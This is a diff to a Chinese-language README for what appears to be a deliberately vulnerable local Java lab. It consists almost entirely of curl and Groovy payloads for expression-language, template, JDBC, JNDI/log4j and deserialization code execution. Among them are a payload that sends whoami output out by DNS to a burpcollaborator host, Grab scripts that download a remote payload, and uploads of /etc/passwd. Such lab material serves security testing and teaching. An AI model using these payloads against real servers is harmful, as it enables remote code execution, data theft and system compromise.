@@ -2,25 +2,79 @@
 
 #### ScriptEngineManager
 
-```
+```bash
 curl 127.0.0.1:8080/script/javascript -d 'expression=java.lang.Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
 ```
 
 #### EL
 
-```
+```bash
 curl 127.0.0.1:8080/el/parse -d 'expression=Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
 ```
 
 #### groovy
 
+接口
+
+```bash
+curl 127.0.0.1:8080/groovy/parse -H "Content-Type: text/plain" --data-binary @script.vy
+curl 127.0.0.1:8080/groovy/parseClass -H "Content-Type: text/plain" --data-binary @script.vy
+curl 127.0.0.1:8080/groovy/evaluate -H "Content-Type: text/plain" --data-binary @script.vy
 ```
-curl 127.0.0.1:8080/groovy/parse -d 'expression="open /System/Applications/Calculator.app".execute()'
+
+测试脚本 - AST
+
+```groovy
+@groovy.transform.ASTTest(value={
+   assert java.lang.Runtime.getRuntime().exec("open /System/Applications/Calculator.app")
+})
+def x
+```
+
+测试脚本 - 需要联网
+
+```groovy
+import org.buildobjects.process.ProcBuilder
+@Grab('org.buildobjects:jproc:2.2.3')
+class Dummy{}
+print new ProcBuilder("open /System/Applications/Calculator.app").run().getOutputString()
+```
+
+测试脚本 - 需要联网
+
+```groovy
+@GrabConfig(disableChecksums=true)
+@GrabResolver(name='payload', root='http://127.0.0.1')
+@Grab(group='package', module='payload', version='1')
+import Payload;
+```
+
+log4j
+
+```groovy
+import org.apache.logging.log4j.*;
+
+Logger logger = LogManager.getLogger(getClass());
+logger.info ('a={}', '${jndi:ldap://127.0.0.1:1389/a}');
+```
+
+[dnslog + 结果上报](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)
+
+```groovy
+import groovy.*;
+
+@groovy.transform.ASTTest(value={
+cmd = "whoami";
+out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
+cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".XXXXX.burpcollaborator.net";
+java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
+})
+def x
 ```
 
 #### ognl
 
-```
+```bash
 curl 127.0.0.1:8080/ognl/parse -d 'expression=#a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"open", "/System/Applications/Calculator.app/"})).start()'
 ```
 
@@ -28,25 +82,25 @@ curl 127.0.0.1:8080/ognl/parse -d 'expression=#a%3d(new java.lang.ProcessBuilder
 
 普通执行
 
-```
+```bash
 curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")'
 ```
 
 读取输出: 用getErrorStream()读取stderr
 
-```
+```bash
 curl 127.0.0.1:8080/spel/parse -d 'expression=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("bash", "-c", "whoami").start().getInputStream(), "utf8")).readLine()'
 ```
 
 class加载
 
-```
+```bash
 curl 127.0.0.1:8080/spel/parse -d 'expression=T(org.springframework.cglib.core.ReflectUtils).defineClass("Foo",T(org.springframework.util.Base64Utils).decodeFromString("XXX"),new+javax.management.loading.MLet(new+java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()'
 ```
 
 RMI
 
-```
+```bash
 curl 127.0.0.1:8080/spel/parse -d 'expression=new+javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"),new java.util.Hashtable()).connect()'
 
 curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.System).setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true") %2B new javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"), new java.util.Hashtable()).connect()'
@@ -54,7 +108,7 @@ curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.System).setProperty("c
 
 #### mvel
 
-```
+```bash
 curl 127.0.0.1:8080/mvel/parse -d 'expression=Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
 ```
 
@@ -64,13 +118,13 @@ curl 127.0.0.1:8080/mvel/parse -d 'expression=Runtime.getRuntime().exec("open /S
 
 socket factory
 
-```
+```bash
 curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:5432/testdb?socketFactory%3dorg.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=http://127.0.0.1:8000/bean-exec.xml'
 ```
 
 ssl factory
 
-```
+```bash
 echo S | ncat -l -vv -p 5432
 
 curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:5432/testdb?sslfactory%3dorg.springframework.context.support.FileSystemXmlApplicationContext%26sslfactoryarg=http://127.0.0.1:8000/bean-exec.xml'
@@ -78,7 +132,7 @@ curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:54
 
 #### readObject()
 
-```
+```bash
 ysoserial CommonsCollections6 "open /System/Applications/Calculator.app" > test
 curl 127.0.0.1:8080/object/parse --data-binary @test -H 'Content-Type: text/plain'
 rm -f test
@@ -175,8 +229,12 @@ curl 'http://127.0.0.1:8080/thymeleaf/path?lang=__%24%7BT(java.lang.Runtime).get
 
 #### 文件上传
 
+支持SpringBoot、Servlet、Commons三种方式
+
 ```
 curl '127.0.0.1:8080/file/upload' -F file=@/etc/passwd
+curl '127.0.0.1:8080/file2/upload' -F file=@/etc/passwd
+curl '127.0.0.1:8080/file3/upload' -F file=@/etc/passwd
 ```
 
 #### MyBatis
